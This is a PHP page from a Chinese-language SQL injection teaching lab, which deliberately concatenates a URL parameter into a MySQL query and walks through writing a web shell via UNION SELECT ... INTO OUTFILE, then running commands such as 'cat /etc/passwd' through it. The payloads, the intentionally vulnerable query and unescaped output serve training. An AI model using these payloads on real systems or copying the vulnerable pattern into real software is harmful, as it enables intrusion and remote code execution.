<?php
header("Content-Type: text/html; charset=utf-8");
$mysqli = new mysqli("db", "sqli", "sqli123", "sqli_lab");
$mysqli->set_charset("utf8mb4");

if ($mysqli->connect_error) {
    die("連線失敗: " . $mysqli->connect_error);
}

$id = $_GET['id'] ?? '';

echo "<h2>📂 INTO OUTFILE - 寫入 WebShell 測試</h2>";

$query = "SELECT id, name, description FROM products WHERE id = $id";
echo "<p><strong>執行的 SQL：</strong><code>" . $query . "</code></p>";

if ($id !== '') {
    $result = $mysqli->query($query);

    if ($result) {
        if ($result->num_rows > 0) {
            echo "<table border='1' cellpadding='6' cellspacing='0'>";
            echo "<tr><th>ID</th><th>名稱</th><th>描述</th></tr>";
            while ($row = $result->fetch_assoc()) {
                echo "<tr>";
                echo "<td>" . htmlspecialchars((string)$row['id']) . "</td>";
                echo "<td>" . $row['name'] . "</td>";
                echo "<td>" . $row['description'] . "</td>";
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "<p style='color:orange;'>⚠️ 查無資料（但 SQL 語法正確）</p>";
        }
    } else {
        echo "<p style='color:red;'>❌ SQL 錯誤：{$mysqli->error}</p>";
    }
} else {
    echo "<p style='color:gray;'>請在網址加上 <code>?id=1</code> 開始測試。</p>";
}
?>

<hr>
<h3>💡 INTO OUTFILE WebShell 寫入教學</h3>

<h4>前置條件（本 Lab 已預先設定好）</h4>
<ul>
  <li>MySQL 帳號需有 <code>FILE</code> 權限 → 已用 <code>GRANT FILE ON *.* TO 'sqli'@'%'</code> 授權</li>
  <li><code>secure_file_priv</code> 必須為空值 → docker-compose 已設定 <code>--secure-file-priv=""</code></li>
  <li>Web 目錄需有寫入權限 → 請先對主機執行 <code>chmod 777 ~/sqli-lab/web</code></li>
</ul>

<h4>用 phpMyAdmin 驗證權限（正式 SQL 練習）</h4>
<p>開啟 <a href="http://localhost:5989" target="_blank">phpMyAdmin（port 5989）</a>，帳號 <code>sqli</code> / 密碼 <code>sqli123</code>，在 SQL 頁籤輸入以下語法：</p>
<pre>-- 確認 FILE 權限
SHOW GRANTS FOR 'sqli'@'%';

-- 確認 secure_file_priv（空值代表無限制）
SHOW VARIABLES LIKE 'secure_file_priv';

-- 確認欄位數
SELECT id, name, description FROM products WHERE id = 0
UNION SELECT 1,2,3;

-- 直接寫入 WebShell
SELECT 1,"<?php echo shell_exec($_GET['c']);?>",3
INTO OUTFILE '/var/www/html/shell.php';
</pre>

<h4>Step 1 — 確認欄位數</h4>
<ul>
  <li><code>?id=1 ORDER BY 3--+</code> ← 正常</li>
  <li><code>?id=1 ORDER BY 4--+</code> ← 報錯 → 確認有 3 個欄位</li>
</ul>

<h4>Step 2 — 確認 secure_file_priv</h4>
<ul>
  <li><code>?id=0 UNION SELECT 1,@@secure_file_priv,3--+</code> ← 空值代表可寫入任意路徑</li>
</ul>

<h4>Step 3 — 寫入 WebShell</h4>
<ul>
  <li><code>?id=0 UNION SELECT 1,"&lt;?php echo shell_exec($_GET['c']);?&gt;",3 INTO OUTFILE '/var/www/html/shell.php'--+</code></li>
</ul>
<p>⚠️ 路徑說明：MySQL container 內的 <code>/var/www/html/</code> 透過 volume 對應到主機的 <code>~/sqli-lab/web/</code>，所以寫進去的檔案 Apache 馬上可以存取。</p>

<h4>Step 4 — 執行指令</h4>
<ul>
  <li>成功後存取：<a href="/shell.php?c=id" target="_blank"><code>/shell.php?c=id</code></a></li>
  <li><code>/shell.php?c=whoami</code></li>
  <li><code>/shell.php?c=cat /etc/passwd</code></li>
  <li><code>/shell.php?c=ls /var/www/html</code></li>
</ul>

<h4>常見錯誤</h4>
<ul>
  <li><strong>Permission denied (Errcode: 13)</strong> → 主機執行 <code>chmod 777 ~/sqli-lab/web</code></li>
  <li><strong>File already exists</strong> → 換個檔名，例如 <code>shell2.php</code></li>
  <li><strong>Access denied for FILE</strong> → 需重建 DB container：<code>docker-compose down -v && docker-compose up -d</code></li>
</ul>

<p><a href="index.php">← 回到總覽</a></p>
